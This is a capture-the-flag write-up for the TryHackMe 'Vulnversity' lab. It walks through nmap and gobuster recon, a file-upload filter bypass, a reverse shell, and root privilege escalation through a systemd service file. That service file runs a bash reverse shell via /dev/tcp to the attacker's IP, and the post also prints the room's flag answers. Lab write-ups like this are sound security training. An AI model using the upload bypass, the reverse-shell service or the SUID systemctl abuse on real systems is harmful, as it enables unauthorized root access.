---
title: "TryHackMe -Vulversity"
classes: wide
search: false
categories: 
  - TryHackMe
toc: true
toc_label: "Contents"
last_modified_at: 2020-06-02T15:58:26+08:00
---

> Learn about active recon, web app attacks and privilege escalation.

### Task 2 - Reconnaissance, need an answer

#### #2. Scan the box, how many ports are open?

in this case, we tried to use nmap for grabing network information

```
╰─$ sudo nmap -sV 10.10.201.124
[sudo] password for twseptian: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 09:47 WIB
Nmap scan report for 10.10.201.124
Host is up (0.40s latency).                                                   
Not shown: 994 closed ports                                                   
PORT     STATE SERVICE     VERSION                                            
21/tcp   open  ftp         vsftpd 3.0.3                                       
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)                                                                     
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)        
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)        
3128/tcp open  http-proxy  Squid http proxy 3.5.12                            
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))                     
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                        
                                                                              
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                              
Nmap done: 1 IP address (1 host up) scanned in 56.63 seconds   
```
ANS: `6`

#### #3. What version of the squid proxy is running on the machine?
ANS: `3.5.12`

#### #4. How many ports will nmap scan if the flag -p-400 was used?
the nmap of scanning
```
╭─twseptian@twsterlab ~/lab/THM/rooms/vulnversity 
╰─$ sudo nmap -sV -p-400 10.10.201.124                                  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 09:50 WIB
Nmap scan report for 10.10.201.124
Host is up (0.27s latency).
Not shown: 397 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.31 seconds
```
ANS: `400`

#### #5. Using the nmap flag -n what will it not resolve?

Hint
```
IP to hostname
```
nmap scanning result

```
╭─twseptian@twsterlab ~/lab/THM/rooms/vulnversity 
╰─$ nmap -n 10.10.201.124
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 09:57 WIB
Nmap scan report for 10.10.201.124
Host is up (0.23s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
```
ANS: `DNS`

#### #6. What is the most likely operating system this machine is running?

Hint
```
Run nmap with the -O flag
```
ANS: `Ubuntu`

#### #7. What port is the web server running on?

ANS: `3333`

### Task 3 - Locating directories using GoBuster 
#### #2. What is the directory that has an upload form page?

use gobuster for web directory fuzzing
```
╭─twseptian@twsterlab ~/lab/THM/rooms/vulnversity 
╰─$ gobuster dir -u http://10.10.201.124:3333 -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.201.124:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/02 10:04:01 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
===============================================================
2020/06/02 10:06:14 Finished
===============================================================
```
ANS: `/internal/`

### Task 4 - Compromise the webserver
#### #1. Try upload a few file types to the server, what common extension seems to be blocked?

ANS: `.php`

#### #3. We're going to use Intruder (used for automating customised attacks).
To begin, make a wordlist with the following extensions in:

![filelist](/assets/images/thm-vulversity/01.png)

Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.
Click the "Positions" tab now, find the filename and "Add §" to the extension. It should look like so:

![02](/assets/images/thm-vulversity/02.png)

Run this attack, what extension is allowed?

ANS: `.phtml`
	
#### #5. What user was running the web server?

```
╭─twseptian@twsterlab ~/lab/THM/rooms/vulnversity 
╰─$ nc -lvnp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.201.124.
Ncat: Connection from 10.10.201.124:35578.
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 23:36:38 up 42 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:111:119:ftp daemon,,,:/srv/ftp:/bin/false
bill:x:1000:1000:,,,:/home/bill:/bin/bash
```
go to `/home/bill` and find `user.txt`

ANS: `bill`

#### #6. What is the user flag?

Hint
```
The contents of the file /home/bill/user.txt
```

ANS:`8bd7992fbe8a6ad22a63361004cfcedb`

### Task 5 - Privilege Escalation 
#### #1. In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

![03](/assets/images/thm-vulversity/03.jpg)

On the system, search for all SUID files. What file stands out?

Hint
```
Use the command: find / -user root -perm -4000 -exec ls -ldb {} \;
```

ANS: `/bin/systemctl`

#### #2. Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?

Become root and get the last flag (/root/root.txt)

hint
```
/bin/systemctl
```

create root.service
```
[Unit]
Description=access root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.19.3/9999 0>&1'

[Install]
WantedBy=multi-user.target
```
and enable root.service using systemctl
```
$ /bin/systemctl enable /tmp/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /tmp/root.service.
Created symlink from /etc/systemd/system/root.service to /tmp/root.service.
$ /bin/systemctl start root
```
create reverse connection in a new terminal and go to root directory
```
╭─twseptian@twsterlab ~/lab/THM/rooms/vulnversity 
╰─$ nc -lvp 9999                
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.201.124.
Ncat: Connection from 10.10.201.124:36448.
bash: cannot set terminal process group (20501): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# ls -la
ls -la
total 96
drwxr-xr-x  23 root root  4096 Jul 31  2019 .
drwxr-xr-x  23 root root  4096 Jul 31  2019 ..
drwxr-xr-x   2 root root  4096 Jul 31  2019 bin
drwxr-xr-x   3 root root  4096 Jul 31  2019 boot
drwxr-xr-x  17 root root  3700 Jun  1 22:54 dev
drwxr-xr-x  98 root root  4096 Aug  1  2019 etc
drwxr-xr-x   3 root root  4096 Jul 31  2019 home
lrwxrwxrwx   1 root root    33 Jul 31  2019 initrd.img -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x  22 root root  4096 Jul 31  2019 lib
drwxr-xr-x   2 root root  4096 Jul 31  2019 lib64
drwx------   2 root root 16384 Jul 31  2019 lost+found
drwxr-xr-x   3 root root  4096 Jul 31  2019 media
drwxr-xr-x   2 root root  4096 Feb 26  2019 mnt
drwxr-xr-x   2 root root  4096 Feb 26  2019 opt
dr-xr-xr-x 138 root root     0 Jun  1 22:54 proc
drwx------   4 root root  4096 Jul 31  2019 root
drwxr-xr-x  28 root root   980 Jun  1 22:54 run
drwxr-xr-x   2 root root 12288 Jul 31  2019 sbin
drwxr-xr-x   2 root root  4096 Jul 31  2019 snap
drwxr-xr-x   3 root root  4096 Jul 31  2019 srv
dr-xr-xr-x  13 root root     0 Jun  1 22:54 sys
drwxrwxrwt   9 root root  4096 Jun  2 00:17 tmp
drwxr-xr-x  10 root root  4096 Jul 31  2019 usr
drwxr-xr-x  14 root root  4096 Jul 31  2019 var
lrwxrwxrwx   1 root root    30 Jul 31  2019 vmlinuz -> boot/vmlinuz-4.4.0-142-generic
root@vulnuniversity:/# cd /root
cd /root
root@vulnuniversity:~# ls -la
ls -la
total 28
drwx------  4 root root 4096 Jul 31  2019 .
drwxr-xr-x 23 root root 4096 Jul 31  2019 ..
lrwxrwxrwx  1 root root    9 Jul 31  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jul 31  2019 .cache
drwxr-xr-x  2 root root 4096 Jul 31  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Jul 31  2019 root.txt
root@vulnuniversity:~# cat root.txt
cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
root@vulnuniversity:~# 
```

ANS: `a58ff8579f0a9270368d33a9966c7fd5`

### Reference:
- https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49